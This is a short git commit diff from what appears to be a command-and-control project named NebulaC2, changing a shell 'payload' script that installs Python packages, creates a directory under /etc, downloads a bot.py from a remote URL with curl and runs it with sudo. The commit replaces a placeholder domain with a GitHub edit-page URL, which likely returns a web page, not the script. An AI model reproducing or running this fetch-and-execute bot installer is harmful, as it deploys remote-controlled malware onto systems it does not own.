68f119ddd260be0fde06558bc5d211264c9d3fee
Nix <73953379+NixWasHere@users.noreply.github.com>
2023-03-02 16:25:19 +0100

    Update and rename payload.txt to payload.sh

--- src/Payload/payload.sh
+++ src/Payload/payload.sh
@@ -3,5 +3,5 @@ pip install cloudscraper requests && pip3 install cloudscraper requests
 cd /etc
 mkdir bot
 cd /etc/bot
-curl https://your-domain/bot.py
+curl https://github.com/NixWasHere/NebulaC2/edit/main/src/Payload/bot.py
 sudo python3 bot.py
